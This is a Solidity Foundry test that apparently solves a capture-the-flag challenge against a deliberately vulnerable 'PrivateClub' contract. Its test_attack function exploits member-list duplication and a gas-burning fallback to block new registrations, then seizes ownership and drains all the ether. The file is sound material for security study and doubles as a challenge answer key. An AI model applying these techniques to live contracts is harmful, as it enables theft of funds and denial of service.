// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";
import "../src/PrivateClub.sol";
import "../src/Attack.sol";

contract Hack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();
        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution:

        //register with yourself in the members list
        Attack attack_contract = new Attack(payable(address(club)));

        //register yourself (without spending anything)
        address[] memory address_array = new address[](3);
        for (uint i = 0; i < 3; i++)
        {
            address_array[i] = hacker;
        }
        club.becomeMember{value:3 ether}(address_array);

	//add multiple instances of the attack contract as members
        attack_contract.attack{value: 10 ether}(4);
        attack_contract.attack(5);
        attack_contract.attack(6);
        attack_contract.attack(7);
        attack_contract.attack(8);
        attack_contract.attack(9);

	//set the attack contract to burn gas on fallback
        attack_contract.finishFirstPhase();
        
        vm.stopPrank();
        // check - hacker is member
        assertTrue(club.members(hacker));

        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);
        vm.stopPrank();

        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:

	//buy the owner the ownership
        attack_contract.attack2();

	//withdraw everything
        club.adminWithdraw(hacker, address(club).balance);
        
        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}